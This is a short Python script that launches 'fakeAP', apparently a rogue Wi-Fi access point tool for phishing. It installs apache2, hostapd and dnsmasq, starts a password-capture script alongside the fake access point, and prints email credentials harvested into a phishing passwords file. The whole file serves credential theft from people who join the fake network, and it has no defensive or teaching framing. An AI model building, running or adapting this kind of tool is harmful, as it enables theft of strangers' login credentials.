import os

#install dependecies on first time running
def first_time():
	yn_ans = raw_input("\n\n***************Welcome to fakeAP***************\n\n Do you want to do First Time Wizard Install? [Y/n]\n\n")
	if yn_ans == '' or yn_ans == 'Y' or yn_ans == 'y':
		setup_dep()
		

def setup_dep():
	os.system("sudo apt update")
	dep = "apache2 hostapd dnsmasq"
	os.system("sudo apt install " + dep + " -y")

#print captured passwords
def print_passwords():
	print "\n\n*************** passwords captured: ***************\n"
	os.system("grep -w mail phishing/passwords.txt ")

#**********************************************main*******************************************************#
first_time()
os.system("python src/capture_password.py & python src/fakeAP.py")
print_passwords()
